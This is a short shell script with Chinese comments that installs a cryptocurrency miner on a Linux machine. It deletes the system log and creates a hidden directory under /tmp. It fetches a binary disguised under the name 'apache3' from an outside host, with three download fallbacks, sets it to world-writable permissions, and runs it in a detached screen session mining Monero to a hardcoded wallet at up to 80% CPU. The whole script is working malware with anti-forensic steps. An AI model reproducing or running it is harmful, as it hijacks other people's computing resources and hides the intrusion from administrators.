#修改最大文件限制数
ulimit -n 65535
#删除日志文件
rm -rf /var/log/syslog
mkdir /tmp/.apache3 
sudo apt-get install screen
cd /tmp/.apache3
sudo curl -fsS http://www.baozhazhi.lol/apache3 -o apache3||sudo wget -q http://www.baozhazhi.lol/apache3 -O apache3||sudo python -c 'import urllib2 as fbi;print fbi.urlopen(\"http://www.baozhazhi.lol/apache3\").read()'
sudo chmod 777 apache3 
sudo screen -S apache3 && cd /tmp/.apache3 && ./apache3 --coin=monero -o auto.c3pool.org:19999 -u 4AtoXP1SJDJ3C5PU2D5X3yBJnnHYwVu1H9Heu8wB5MA9Zp9Fsqy8iyuCHQ4hi4y6JmRnYjZHcVxuK1DfMhMtc13mTWjWLFa -p x --donate-level=0 --background --cpu-max-threads-hint=80
